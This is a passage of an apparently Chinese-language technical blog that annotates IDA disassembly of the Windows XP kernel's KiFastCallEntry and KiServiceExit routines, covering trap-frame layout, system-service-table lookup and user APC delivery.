_KTRAP_FRAME.SegFs = 0x3B，让3环FS找到对应的段描述符</span></span><br><span class="line">.text:<span class="number">0046</span>A55D                 mov     esi, [ebx+_KPCR.PrcbData.CurrentThread]</span><br><span class="line">.text:<span class="number">0046</span>A563                 push    dword ptr [ebx] <span class="comment">// 保存旧的 ExceptionList</span></span><br><span class="line">.text:<span class="number">0046</span>A565                 mov     dword ptr [ebx], <span class="number">0F</span>FFFFFFFh <span class="comment">// 当前线程ExceptionList = -1</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                 mov     ebp, [esi+_KTHREAD.InitialStack] <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// ebp = _KPCR._KPRCB._KTHREAD.InitialStack（栈底），KernelStack（栈顶）</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// 从线程切换分析可以知道：KTHREAD.InitialStack（栈底）指向当前线程的浮点寄存器 共0x210字节</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// 也就是 KTHREAD 堆栈的是这样的：</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// - TrapFrame（共0x8c字节） + 浮点寄存器（共0x210字节） == 0x29C</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// - KTHREAD.InitialStack = 指向 TrapFrame + 浮点寄存器，【栈底】</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A56B                                         <span class="comment">// ----</span></span><br><span class="line">.text:<span class="number">0046</span>A56E                 push    <span class="number">1</span>               <span class="comment">// _KTRAP_FRAME.PreviousPreviousMode = 1，表示从3环来</span></span><br><span class="line">.text:<span class="number">0046</span>A570                 sub     esp, <span class="number">48</span>h        <span class="comment">// esp0 指向_TrapFrame首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A573                 sub     ebp, <span class="number">29</span>Ch       <span class="comment">// esp0 = ebp0 = _KTRAP_FRAME首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A579                 mov     [esi+_KTHREAD.PreviousMode], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A580                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">0046</span>A582                 jnz     <span class="keyword">short</span> loc_46A511 <span class="comment">// esp0 != ebp0，跳到异常处理即 INT 6，6号异常中断--无效操作码</span></span><br><span class="line">.text:<span class="number">0046</span>A584                 <span class="keyword">and</span>     [ebp+_KTRAP_FRAME.Dr7], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A588                 test    [esi+_KTHREAD.DebugActive], <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A58C                 mov     [esi+_KTHREAD.TrapFrame], ebp <span class="comment">// _KTHREAD.TrapFrame = ebp 存起来</span></span><br><span class="line">.text:<span class="number">0046</span>A592                 jnz     Dr_FastCallDrSave <span class="comment">// DebugActive != -1，就表示被调试，会把Dr0-Dr7存到TrapFrame结构体中</span></span><br><span class="line">.text:<span class="number">0046</span>A592                                         <span class="comment">// 如果当前的线程处于调试状态，那么这里面的值不为零</span></span><br><span class="line">.text:<span class="number">0046</span>A598</span><br><span class="line">.text:<span class="number">0046</span>A598 loc_46A598:                             <span class="comment">// CODE XREF: Dr_FastCallDrSave+10↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A598                                         <span class="comment">// Dr_FastCallDrSave+7C↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A598                 mov     ebx, [ebp+_KTRAP_FRAME._Ebp] <span class="comment">// ebx == ebp3，但是在本函数内，并没有对ebp3进行赋值处理</span></span><br><span class="line">.text:<span class="number">0046</span>A59B                 mov     edi, [ebp+_KTRAP_FRAME._Eip] <span class="comment">// edi = eip3 == _KUSER_SHARED_DATA.SystemCallReturn</span></span><br><span class="line">.text:<span class="number">0046</span>A59E                 mov     [ebp+_KTRAP_FRAME.DbgArgPointer], edx <span class="comment">// edx 指向 3 环的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5A1                 mov     [ebp+_KTRAP_FRAME.DbgArgMark], <span class="number">0B</span>ADB0D00h</span><br><span class="line">.text:<span class="number">0046</span>A5A8                 mov     [ebp+_KTRAP_FRAME.DbgEbp], ebx</span><br><span class="line">.text:<span class="number">0046</span>A5AB                 mov     [ebp+_KTRAP_FRAME.DbgEip], edi</span><br><span class="line">.text:<span class="number">0046</span>A5AE                 sti</span><br><span class="line">.text:<span class="number">0046</span>A5AF</span><br><span class="line">.text:<span class="number">0046</span>A5AF loc_46A5AF:                             <span class="comment">// CODE XREF: _KiBBTUnexpectedRange+18↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// _KiSystemService+72↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                 mov     edi, eax        <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// 下面开始是 KiSystemService 和 KiFastCallEntry 的汇聚点</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - esp = ebp = _KTRAP_FRAME首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - edx == 指向3环参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// - eax == 系统服务号</span></span><br><span class="line">.text:<span class="number">0046</span>A5AF                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A5B1                 shr     edi, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                 <span class="keyword">and</span>     edi, <span class="number">30</span>h        <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 取系统服务号的 bit12,bit13== 0。</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 即00bit13bit12 xxxx &amp; 0011 0000 == 0001 0000/0000 0000</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// 结果为：0x10/0x00</span></span><br><span class="line">.text:<span class="number">0046</span>A5B4                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5B7                 mov     ecx, edi</span><br><span class="line">.text:<span class="number">0046</span>A5B9                 add     edi, [esi+_KTHREAD.ServiceTable] <span class="comment">// 取 SSDT/SSDT Shadow 表</span></span><br><span class="line">.text:<span class="number">0046</span>A5BF                 mov     ebx, eax</span><br><span class="line">.text:<span class="number">0046</span>A5C1                 <span class="keyword">and</span>     eax, <span class="number">0F</span>FFh      <span class="comment">// 取系统服务号的低 12 位，即在SST函数表的索引号</span></span><br><span class="line">.text:<span class="number">0046</span>A5C6                 cmp     eax, [edi+<span class="number">8</span>]    <span class="comment">// 系统调用号 - SST.ServiceLimit，判断函数是否在表的范围内</span></span><br><span class="line">.text:<span class="number">0046</span>A5C9                 jnb     _KiBBTUnexpectedRange <span class="comment">// 系统调用号 &gt;= SST.ServiceLimit，不在表里，跳转异常处理</span></span><br><span class="line">.text:<span class="number">0046</span>A5CF                 cmp     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A5D2                 jnz     <span class="keyword">short</span> loc_46A5EF <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5D2                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5D4                 mov     ecx, large fs:_KPCR.NtTib.Self</span><br><span class="line">.text:<span class="number">0046</span>A5DB                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A5DD</span><br><span class="line">.text:<span class="number">0046</span>A5DD loc_46A5DD:                             <span class="comment">// DATA XREF: _KiTrap0E+117↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A5DD                 <span class="keyword">or</span>      ebx, [ecx+<span class="number">0F</span>70h]</span><br><span class="line">.text:<span class="number">0046</span>A5E3                 jz      <span class="keyword">short</span> loc_46A5EF <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5E3                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5E5                 push    edx</span><br><span class="line">.text:<span class="number">0046</span>A5E6                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A5E7                 call    ds:_KeGdiFlushUserBatch</span><br><span class="line">.text:<span class="number">0046</span>A5ED                 pop     eax</span><br><span class="line">.text:<span class="number">0046</span>A5EE                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A5EF</span><br><span class="line">.text:<span class="number">0046</span>A5EF loc_46A5EF:                             <span class="comment">// CODE XREF: _KiFastCallEntry+B2↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// _KiFastCallEntry+C3↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                 inc     large dword ptr fs:_KPCR.PrcbData.KeSystemCalls <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// 判断系统服务号的函数是ntoskrnl.exe</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// 系统调用计数加1，即函数KiFastCallEntry被调用次数++</span></span><br><span class="line">.text:<span class="number">0046</span>A5EF                                         <span class="comment">// --</span></span><br><span class="line">.text:<span class="number">0046</span>A5F6                 mov     esi, edx        <span class="comment">// edx 指向3环 API 的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A5F8                 mov     ebx, [edi+<span class="number">0</span>Ch]  <span class="comment">// ebx 指向 SST 的参数表，ebx = SST.ArgmentTable</span></span><br><span class="line">.text:<span class="number">0046</span>A5FB                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0046</span>A5FD                 mov     cl, [eax+ebx]   <span class="comment">// ecx = SST.ArgmentTable + 系统调用号低12位*1，即ecx = 函数参数大小</span></span><br><span class="line">.text:<span class="number">0046</span>A600                 mov     edi, [edi]      <span class="comment">// edi = SST.ServiceTable = KeServiceDescriptorTable</span></span><br><span class="line">.text:<span class="number">0046</span>A602                 mov     ebx, [edi+eax*<span class="number">4</span>] <span class="comment">// ebx = SST.ServiceTable + 系统调用号低12位*4 = 函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A605                 sub     esp, ecx        <span class="comment">// 0环抬高栈顶，马上将3环参数复制到0环</span></span><br><span class="line">.text:<span class="number">0046</span>A607                 shr     ecx, <span class="number">2</span>          <span class="comment">// ecx = 参数个数 = 参数大小/4，作为拷贝的次数（一次拷贝4字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A60A                 mov     edi, esp</span><br><span class="line">.text:<span class="number">0046</span>A60C                 cmp     esi, ds:_MmUserProbeAddress</span><br><span class="line">.text:<span class="number">0046</span>A612                 jnb     loc_46A7C0</span><br><span class="line">.text:<span class="number">0046</span>A618</span><br><span class="line">.text:<span class="number">0046</span>A618 loc_46A618:                             <span class="comment">// CODE XREF: _KiFastCallEntry+2A4↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// DATA XREF: _KiTrap0E+10D↓o</span></span><br><span class="line">.text:<span class="number">0046</span>A618                 rep movsd               <span class="comment">// 可以得知：当前函数的堆栈（也是当前线程的堆栈）从栈顶到栈底的分布情况：</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 1. 从3环拷贝过来的3环API参数</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 2. Trapframe（共0x8C字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A618                                         <span class="comment">// 3. 浮点寄存器（共0x210字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                 call    ebx             <span class="comment">// ==========</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 此时：</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 1、esp 指向拷贝过来的3环API的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 2、ebp = 当前函数堆栈中 _KTRAP_FRAME 的首地址</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 3、ebx = 系统服务函数地址</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 4、edx：指向3环地址，即 API 的第一个参数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 5、eax = 系统服务号的低 12 位</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 6、edi = 指向拷贝过来的3环API的最后一个参数（0环堆栈）</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 7、esi = 指向3环API的最后一个参数（3环堆栈），esi = edx + ecx*4</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// 8、ecx = 3环 NT* API 函数的参数个数</span></span><br><span class="line">.text:<span class="number">0046</span>A61A                                         <span class="comment">// ==========</span></span><br><span class="line">.text:<span class="number">0046</span>A61C</span><br><span class="line">.text:<span class="number">0046</span>A61C loc_46A61C:                             <span class="comment">// CODE XREF: _KiFastCallEntry+2AF↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A61C                                         <span class="comment">// DATA XREF: _KiTrap0E+12D↓o ...</span></span><br><span class="line">.text:<span class="number">0046</span>A61C                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">0046</span>A61E</span><br><span class="line">.text:<span class="number">0046</span>A61E loc_46A61E:                             <span class="comment">// CODE XREF: _KiBBTUnexpectedRange+38↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A61E                                         <span class="comment">// _KiBBTUnexpectedRange+43↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A61E                 mov     ecx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A625                 mov     edx, [ebp+_KTRAP_FRAME._Edx] <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 在ROS P24 有这样的代码：</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// Save the old trap frame pointer where EDX would be saved</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov ebx, [esi+KTHREAD_TRAP_FRAME]     //KTHREAD 结构中的指针 TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov [ebp+KTRAP_FRAME_EDX], ebx        //暂时保存在这里</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 这是因为：加入一个线程多次从R3--&gt;R0--&gt;R3--&gt;R0，每一次进来R0都会构建一个新</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// 的TrapFrame结构在当前线程堆栈里面，那么可以使用当前KTRAP_FRAME_EDX来保存上一个</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// TrapFrame，因为这一操作是在下面的指令前进行的操作：</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// mov [esi+_KTHREAD.TrapFrame], ebp</span></span><br><span class="line">.text:<span class="number">0046</span>A625                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A628                 mov     [ecx+_KTHREAD.TrapFrame], edx</span><br><span class="line">.text:<span class="number">0046</span>A628 _KiFastCallEntry endp</span><br><span class="line">.text:<span class="number">0046</span>A628</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// 可以看到这个函数是 KiFastCallEntry 函数的一部分，紧接着这个函数的</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E _KiServiceExit  proc near               <span class="comment">// CODE XREF: KiCallUserMode(x,x)+EC↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A62E                                         <span class="comment">// _KiSetLowWaitHighThread+80↓j ...</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_C           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_40          = dword ptr  <span class="number">44</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_44          = dword ptr  <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_48          = dword ptr  <span class="number">4</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_60          = dword ptr  <span class="number">64</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_64          = dword ptr  <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_68          = dword ptr  <span class="number">6</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A62E arg_6C          = dword ptr  <span class="number">70</span>h</span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E <span class="comment">// FUNCTION CHUNK AT .text:0046A738 SIZE 00000088 BYTES</span></span><br><span class="line">.text:<span class="number">0046</span>A62E</span><br><span class="line">.text:<span class="number">0046</span>A62E                 cli</span><br><span class="line">.text:<span class="number">0046</span>A62F                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// 判断是否是虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A636                 jnz     <span class="keyword">short</span> loc_46A63E <span class="comment">// 是虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A638                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                 jz      <span class="keyword">short</span> loc_46A694 <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A63C                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63E</span><br><span class="line">.text:<span class="number">0046</span>A63E loc_46A63E:                             <span class="comment">// CODE XREF: _KiServiceExit+8↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// _KiServiceExit+64↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                 mov     ebx, large fs:<span class="number">124</span>h <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 从3环退出前，只要还有3环APC还没执行，就会不断的循环去执行</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 虽然在 KiDeliverApc 中一次只会执行一个用户APC，但是</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// 本函数这里是一个循环</span></span><br><span class="line">.text:<span class="number">0046</span>A63E                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A645                 mov     [ebx+_KTHREAD.Alerted], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A649                 cmp     [ebx+_KTHREAD.ApcState.UserApcPending], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                 jz      <span class="keyword">short</span> loc_46A694 <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A64D                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A64F                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">0046</span>A651                 mov     [ebx+_KTRAP_FRAME._Eax], eax</span><br><span class="line">.text:<span class="number">0046</span>A654                 mov     [ebx+_KTRAP_FRAME.SegFs], <span class="number">3B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A65B                 mov     [ebx+_KTRAP_FRAME.SegDs], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A662                 mov     [ebx+_KTRAP_FRAME.SegEs], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">0046</span>A669                 mov     [ebx+_KTRAP_FRAME.SegGs], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A670                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A675                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A67B                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A67C                 sti</span><br><span class="line">.text:<span class="number">0046</span>A67D                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A67E                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A680                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A682                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// VOID KiDeliverApc (</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN KPROCESSOR_MODE PreviousMode,</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN PKEXCEPTION_FRAME ExceptionFrame,</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     IN PKTRAP_FRAME TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A682                                         <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">0046</span>A687                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A688                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A68E                 mov     eax, [ebx+_KTRAP_FRAME._Eax]</span><br><span class="line">.text:<span class="number">0046</span>A691                 cli</span><br><span class="line">.text:<span class="number">0046</span>A692                 jmp     <span class="keyword">short</span> loc_46A63E <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 从3环退出前，只要还有3环APC还没执行，就会不断的循环去执行</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 虽然在 KiDeliverApc 中一次只会执行一个用户APC，但是</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// 本函数这里是一个循环</span></span><br><span class="line">.text:<span class="number">0046</span>A692                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A694 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A694</span><br><span class="line">.text:<span class="number">0046</span>A694 loc_46A694:                             <span class="comment">// CODE XREF: _KiServiceExit+E↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// _KiServiceExit+1F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A694                 mov     edx, [esp+_KTRAP_FRAME.ExceptionList] <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// 来自内核，此时esp指向的trapframe是线程堆栈最栈顶上面的那个，</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// 就是最近一次从3环进入到0环时使用的</span></span><br><span class="line">.text:<span class="number">0046</span>A694                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A698                 mov     ebx, large fs:_KPCR.DebugActive <span class="comment">// 如果当前的线程处于调试状态，那么这里面的值不为-1</span></span><br><span class="line">.text:<span class="number">0046</span>A69F                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0046</span>A6A6                 mov     ecx, [esp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0046</span>A6AA                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0046</span>A6B1                 mov     [esi+_KTHREAD.PreviousMode], cl</span><br><span class="line">.text:<span class="number">0046</span>A6B7                 test    ebx, <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A6BD                 jnz     <span class="keyword">short</span> loc_46A738 <span class="comment">// 异常链表非空，有异常需要处理</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF</span><br><span class="line">.text:<span class="number">0046</span>A6BF loc_46A6BF:                             <span class="comment">// CODE XREF: _KiServiceExit+11A↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF                                         <span class="comment">// _KiServiceExit+149↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6BF                 test    [esp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A6C7                 jnz     loc_46AFD8      <span class="comment">// 虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A6CD                 test    word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">0F</span>FF8h</span><br><span class="line">.text:<span class="number">0046</span>A6D4                 jz      loc_46A78E      <span class="comment">// CS最低位为0，说明先前模式是0</span></span><br><span class="line">.text:<span class="number">0046</span>A6DA                 cmp     word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">1B</span>h</span><br><span class="line">.text:<span class="number">0046</span>A6E0                 bt      word ptr [esp+_KTRAP_FRAME.SegCs], <span class="number">0</span> <span class="comment">// CF位置1</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                 cmc                     <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// CF取反，则 CF == 0</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// https://blog.csdn.net/xiong_xin/article/details/103665440</span></span><br><span class="line">.text:<span class="number">0046</span>A6E7                                         <span class="comment">// ---</span></span><br><span class="line">.text:<span class="number">0046</span>A6E8                 ja      loc_46A77C      <span class="comment">// CF ∨ ZF = 0 时跳转</span></span><br><span class="line">.text:<span class="number">0046</span>A6EE                 cmp     word ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A6F3                 jz      <span class="keyword">short</span> loc_46A6FA</span><br><span class="line">.text:<span class="number">0046</span>A6F5</span><br><span class="line">.text:<span class="number">0046</span>A6F5 loc_46A6F5:                             <span class="comment">// CODE XREF: _KiServiceExit+15B↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A6F5                 lea     esp, [ebp+_KTRAP_FRAME.SegFs]</span><br><span class="line">.text:<span class="number">0046</span>A6F8                 pop     fs              <span class="comment">// 将3环的 FS 赋值给 FS 寄存器</span></span><br><span class="line">.text:<span class="number">0046</span>A6FA                 assume fs:nothing</span><br><span class="line">.text:<span class="number">0046</span>A6FA</span><br><span class="line">.text:<span class="number">0046</span>A6FA loc_46A6FA:                             <span class="comment">// CODE XREF: _KiServiceExit+C5↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A6FA                 lea     esp, [ebp+_KTRAP_FRAME._Edi]</span><br><span class="line">.text:<span class="number">0046</span>A6FD                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A6FE                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A6FF                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A700                 pop     ebp             <span class="comment">// 此时的esp指向ErrCode（+0x64）</span></span><br><span class="line">.text:<span class="number">0046</span>A701                 cmp     word ptr [esp<span class="number">-60</span>h+arg_64], <span class="number">80</span>h <span class="comment">// CS</span></span><br><span class="line">.text:<span class="number">0046</span>A708                 ja      loc_46AFF4</span><br><span class="line">.text:<span class="number">0046</span>A70E                 add     esp, <span class="number">4</span>          <span class="comment">// esp指向EIP3（+0x68）</span></span><br><span class="line">.text:<span class="number">0046</span>A711                 test    [esp<span class="number">-64</span>h+arg_64], <span class="number">1</span> <span class="comment">// cs</span></span><br><span class="line">.text:<span class="number">0046</span>A711 _KiServiceExit  endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A711</span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// ========</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 实际上，如果当前系统支持快速系统调用，那么，这条指令将</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 被修正为“jnz short _KiSystemCallExi2“。而KiSystemCallExit2 所指的代码使用 sysexit</span></span><br><span class="line">.text:<span 